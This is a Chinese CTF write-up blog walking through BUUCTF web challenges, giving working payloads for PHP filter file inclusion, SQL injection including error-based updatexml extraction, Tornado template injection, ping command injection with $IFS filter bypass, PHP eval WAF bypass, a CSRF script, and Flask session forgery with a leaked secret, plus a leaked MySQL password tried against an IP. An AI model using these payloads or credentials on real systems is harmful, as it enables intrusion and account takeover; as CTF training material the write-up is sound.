<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://6f0fd2e6-afd9-415d-8fd6-4680e8378419.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDYyNWY3OGItOTVhOC00NGMxLThjNzctOGNhMjBhNTFjNGQ4fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>

<p>解码如下，得到福来阁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;0625f78b-95a8-44c1-8c77-8ca20a51c4d8&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="四、-极客大挑战-2019-EasySQL"><a href="#四、-极客大挑战-2019-EasySQL" class="headerlink" title="四、[极客大挑战 2019]EasySQL"></a>四、[极客大挑战 2019]EasySQL</h3><p>Payload：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://1cd20fd9-e3fc-4a11-bb8e-0f7fe320e955.node3.buuoj.cn/check.php?username=1&amp;password=1<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;bb4a6d90-768f-46e4-9a77-c8972f164c59&#125;</span><br></pre></td></tr></table></figure>

<h3 id="五、-ACTF2020-新生赛-Include"><a href="#五、-ACTF2020-新生赛-Include" class="headerlink" title="五、[ACTF2020 新生赛]Include"></a>五、[ACTF2020 新生赛]Include</h3><p>开局预测index.php传入file=，是个文件包含接口，file=index.php时网页有点卡，估计是循环包含了，应该用的不是_once函数，filter来base64一波吧。解下flag.php源码如下…</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;86976d68-2fe1-46be-82fd-a32375998501&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再看看index.php呢，嘻嘻是include</p>
<blockquote>
<p>include与require除了在处理引入文件的方式不同外，最大的区别就是：<br>include在引入不存文件时产生一个警告且脚本还会继续执行，<br>require则会导致一个致命性错误且脚本停止执行。</p>
<p>节选自：include和require的区别(wwlww)：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwlww/p/8413347.html">https://www.cnblogs.com/wwlww/p/8413347.html</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="六、-护网杯-2018-easy-tornado"><a href="#六、-护网杯-2018-easy-tornado" class="headerlink" title="六、[护网杯 2018]easy_tornado"></a>六、[护网杯 2018]easy_tornado</h3><p>存在模板注入，在error?msg=处。</p>
<blockquote>
<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
<p>引自笑花大王:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12285121.html">https://www.cnblogs.com/xhds/p/12285121.html</a></p>
</blockquote>
<p>Payload：<code>http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>可获得环境变量，其中包括了cookie_secret</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;autoreload&#x27;</span>: True, <span class="string">&#x27;compiled_template_cache&#x27;</span>: False, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>根据hints.txt的提示，./fllllllllllllag应该传入的filehash=md5(cookie_secret+md5(filename))，计算过程如下，此计算过程我直接使用了浏览器插件Hasher，它真的很棒。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(/fllllllllllllag) = 3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">cookie_secret = e9d83199-02cc-4dc0-9c5e-db259e149331</span><br><span class="line">md5(e9d83199-02cc-4dc0-9c5e-db259e1493313bf9f6cf685a6dd8defadabfb41a03a1)=f8f08978b32c8b0786ff90a4b4379ea1</span><br></pre></td></tr></table></figure>
<p>另外，直接用python3的hashlib库也可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(bytes(<span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span> + hashlib.md5(<span class="string">b&#x27;/fllllllllllllag&#x27;</span>).hexdigest(), encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=f8f08978b32c8b0786ff90a4b4379ea1</span><br><span class="line"></span><br><span class="line">flag&#123;d8bd1174-f15f-49cf-8c10-8a861e4f7b0b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="七、-极客大挑战-2019-LoveSQL"><a href="#七、-极客大挑战-2019-LoveSQL" class="headerlink" title="七、[极客大挑战 2019]LoveSQL"></a>七、[极客大挑战 2019]LoveSQL</h3><p>​    和第五题一样，可以or万能密码注入。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=1&amp;password=1234<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">Your password is <span class="string">&#x27;70b75a27bc538ac305baffd8aaa79259&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​    此时发现登陆成功后不直接给flag了，尝试报错注入吧。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">数据库：http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^sh<span class="string">&#x27;,(select database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geek^&#x27;</span></span><br><span class="line">------------------------------</span><br><span class="line">数据表：http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geekuser,l0ve1ysq1^&#x27;</span></span><br><span class="line">-------------------------------</span><br><span class="line">爆l0ve1ysq1的字段：http://49e8ad85-99a8-4813-bf93-sh1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(column_name),1,20) from information_schema.columns where  table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^id,username,password^&#x27;</span></span><br><span class="line">--------------------------------</span><br><span class="line">Flag就在10ve1ysq1表中的password字段中，在248以后：</span><br><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(password),248,31) from l0ve1ysq1),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;690ae2e0-9ddf-41e9-a7f6-bc878dd458e3&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B8SxJJ"><img src="https://s1.ax1x.com/2020/10/28/B8SxJJ.png" alt="B8SxJJ.png"></a></p>
<h3 id="八、-GXYCTF2019-Ping-Ping-Ping"><a href="#八、-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="八、[GXYCTF2019]Ping Ping Ping"></a>八、[GXYCTF2019]Ping Ping Ping</h3><p>ping命令注入，过滤了空格、重定向符、单双引号、cat。并且只要字符串中顺序出现flag，不管其中分隔多少字符，都被检测到。例如:<code>f123l123a123g123</code>，这种的话还是可以被检测到，不知道用了啥接口儿，等下哥哥看看源码儿。</p>
<p>解决方法是这里使用变量拼接，且flag拼接的顺序颠倒，$IFS代替空格的方式绕过。</p>
<p>Payload：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://bd478ba2-5157-4cab-8148-49f83abe0e37.node3.buuoj.cn/?ip=;b=g.php;a=fla;tac<span class="variable">$IFS</span><span class="variable">$a</span><span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;71c116c7-dc50-402d-b24e-e91afaedae83&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>看看源码儿啥样</p>
<p>Payload：<code>?ip=;b=x.php;a=inde;cat$IFS$a$b|base64;</code>完了解码儿一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="九、-RoarCTF-2019-Easy-Calc"><a href="#九、-RoarCTF-2019-Easy-Calc" class="headerlink" title="九、[RoarCTF 2019]Easy Calc"></a>九、[RoarCTF 2019]Easy Calc</h3><blockquote>
<p>总结：空格+变量名绕过WAF检测，chr()拼接绕过正则过滤。</p>
</blockquote>
<p>查看源码儿，输入的表达式被URL编码后作为参数传递到calc.php中，查看一下calc.php源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>PHP的字符串解析特性是什么？</p>
<p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
<p>节选自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
</blockquote>
<p>​    这里自己菜了，eval本身就是执行php代码，echo phpinfo();本身就是echo出phpinfo()的代码结果，所以自己甚至复现环境去试验了半天。另外源码中只显示了部分过滤的字符，其中原题中还有WAF。</p>
<p>​    这里的主要绕过方式是PHP字符串解析特性漏洞，num变量前加一个空格，让<strong>waf认为是’ num’变量而绕过过滤</strong>，但<strong>PHP会自动去除空格得到num变量从而绕过WAF</strong>。构造<code> num=phpinfo();</code>成功执行phpinfo，查看一下disable_functions，禁用了非常多的函数。</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BYC8Xj"><img src="https://s1.ax1x.com/2020/10/29/BYC8Xj.png" alt="BYC8Xj.png"></a></p>
<p>​    这里使用<code>scandir()</code>函数读取某目录中的所有文件，返回数组对象。</p>
<p>​    Payload：（<strong>重点：</strong>scandir返回值是一个<strong>数组对象</strong>，因此需要用var_dump才能显示内容），另外’/‘在源码中被过滤，可以使用chr()来绕过。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node3.buuoj.cn:27536/calc.php?num=var_dump(scandir(chr(47)));</span><br><span class="line"></span><br><span class="line">array(24) &#123; [0]=&gt; string(1) <span class="string">&quot;.&quot;</span> [1]=&gt; string(2) <span class="string">&quot;..&quot;</span> [2]=&gt; string(10) <span class="string">&quot;.dockerenv&quot;</span> [3]=&gt; string(3) <span class="string">&quot;bin&quot;</span> [4]=&gt; string(4) <span class="string">&quot;boot&quot;</span> [5]=&gt; string(3) <span class="string">&quot;dev&quot;</span> [6]=&gt; string(3) <span class="string">&quot;etc&quot;</span> [7]=&gt; string(5) <span class="string">&quot;f1agg&quot;</span> [8]=&gt; string(4) <span class="string">&quot;home&quot;</span> [9]=&gt; string(3) <span class="string">&quot;lib&quot;</span> [10]=&gt; string(5) <span class="string">&quot;lib64&quot;</span> [11]=&gt; string(5) <span class="string">&quot;media&quot;</span> [12]=&gt; string(3) <span class="string">&quot;mnt&quot;</span> [13]=&gt; string(3) <span class="string">&quot;opt&quot;</span> [14]=&gt; string(4) <span class="string">&quot;proc&quot;</span> [15]=&gt; string(4) <span class="string">&quot;root&quot;</span> [16]=&gt; string(3) <span class="string">&quot;run&quot;</span> [17]=&gt; string(4) <span class="string">&quot;sbin&quot;</span> [18]=&gt; string(3) <span class="string">&quot;srv&quot;</span> [19]=&gt; string(8) <span class="string">&quot;start.sh&quot;</span> [20]=&gt; string(3) <span class="string">&quot;sys&quot;</span> [21]=&gt; string(3) <span class="string">&quot;tmp&quot;</span> [22]=&gt; string(3) <span class="string">&quot;usr&quot;</span> [23]=&gt; string(3) <span class="string">&quot;var&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>​    chr绕过过滤（<strong>错误点：</strong>chr()本身就是字符类型，使用<code>.</code>拼接即是一段字符串，无须拼接<code>&quot;或&#39;</code>）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:27536/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span></span><br><span class="line"></span><br><span class="line">Flag：flag&#123;bf14d19d-dfef<span class="number">-473</span>c-ba1a-f0a90500f7cc&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十、-HCTF-2018-admin"><a href="#十、-HCTF-2018-admin" class="headerlink" title="十、[HCTF 2018]admin"></a>十、[HCTF 2018]admin</h3><p>​    这道题有点意思，有注册、登录、修改密码、报告四个逻辑。基于对前面XSS和CSRF类型题没有成功做出来过，本能的以为这是一道XSS+CSRF的题。但构造半天Payload，没半点用。上网简单搜索一下，看到了一点hint，修改密码页面的源码有一个github地址。这题的迷惑性真强，真坑。</p>
<p>​    尽管没成功Payload依然留一下，以后或许会用到。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> Ajax=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> sendurl = <span class="string">&quot;http://f1212200-df54-4e57-b763-f3f482413e7a.node3.buuoj.cn/change&quot;</span>;</span><br><span class="line">    Ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    Ajax.open(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">false</span>);    <span class="comment">//true表示异步</span></span><br><span class="line">    Ajax.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    content=<span class="string">&quot;newpassword=123456&quot;</span>;</span><br><span class="line">    Ajax.setRequestHeader(<span class="string">&quot;Host&quot;</span>,<span class="string">&quot;f1212200-df54-4e57-b763-f3f482413e7a.node3.buuoj.cn&quot;</span>);</span><br><span class="line">        Ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">      Ajax.send(content);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>​    下载Github源码，简单分析是一个简单的python flask后端，源码泄露了mysql的配置，所以先尝试了一下远程连接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -padsl1234 -h 111.73.46.229</span><br></pre></td></tr></table></figure>

<p>​    没有成功连接，另外在config.py中发现了flask Session的密钥’ckj123’。这里想到可能是伪造admin用户登录吧。所以这里先拿出GEEK新生赛用过的flask-unsign脚本先进行Session内容的解析。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie <span class="string">&#x27;.eJw9kEFrwkAQhf9KmbMHs5KL4MGSuBiYCYZNl5mLtGtM3DQWotK44n_v4qH39z6-9x6wP47NpYPldbw1M9ifDrB8wNsXLKG02xS9C2x3oTRrJRrvGD58aeuF6MrTkE9o618KbkGZm1DxVJrCc2hT1MWA4dCT2U6sdgmaamDPizLLU_FtSko60bmirOslcwF1PZW6Vqjkm8w6EdPexbzHTn4n4xIydOJQnSgUnWR1gnrTYfRhU8R8u4LnDNxlPO6vP31z_p_AZuPZ0sAhj8h-Lh6D2F3CQ1SyHFU4kBcvRqJG1WHGStarF-78OTQREbyDGdwuzfj6BpI5PP8A-gBk-g.X6EdLA.CyPuxh1U262hdRQNM16v_abocRQ&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ByafG6"><img src="https://s1.ax1x.com/2020/11/03/ByafG6.png" alt="ByafG6.png"></a></p>
<p>​    然后将name中的zjc改为admin使用泄露的密钥进行Session伪造</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;9b9273ad3906dc235c9e7ddc6a11e07774713f192cc890bf37d521cd514fb67819f897fada648dd730e18e63fe505e82e0fb1257553bc4b72ad550aa0c2a2e58&#x27;, &#x27;csrf_token&#x27;: b&#x27;a1cacfc15e94f33ed5bd51f9f6366ce6dd4a066d&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span> --secret <span class="string">&#x27;ckj123&#x27;</span></span><br></pre></td></tr></table></figure>

<p>拿到伪造Session</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMGKwjAURX9lyNqFjXQjuOjQGiy8VyzphPc2orW2TScOtMrUiP8-wcXs7z2ce5_icBmbqRPr23hvFuLQn8X6KT5OYi0Ks4vB1p7M3hc6kazgAf7LFqZasSotumwGU_2ir1eY1jNImgudW_JtDCp34M8D6t1Mch-BLh1ZWhVpFrNtY5Tcscokpt3Aae1BVXOhKgmSv1EnEev2wfozdLIH6jpCjT35skefd5xWEahtB8GHdB7y7Ua8FqKexsvh9jM01_8JpLeWDDryWUAOS7bg2ewjckHJUFAhj5Ytaw4aZQcpSU42b9z16JqAOJ5dfxULcZ-a8f2OiJbi9QfH_GW8.X6Ed-g.tFhNZVqKZhSxPE_IyS0bNicF44s</span><br></pre></td></tr></table></figure>

